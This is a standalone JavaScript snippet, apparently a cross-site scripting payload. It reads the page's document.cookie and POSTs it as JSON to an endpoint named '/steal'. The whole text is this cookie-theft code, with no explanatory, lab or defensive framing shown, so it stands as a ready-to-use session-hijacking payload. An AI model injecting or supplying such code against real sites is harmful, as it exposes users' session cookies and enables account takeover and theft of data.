fetch('/steal', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json'},
    body: JSON.stringify({ cookie: document.cookie })
})
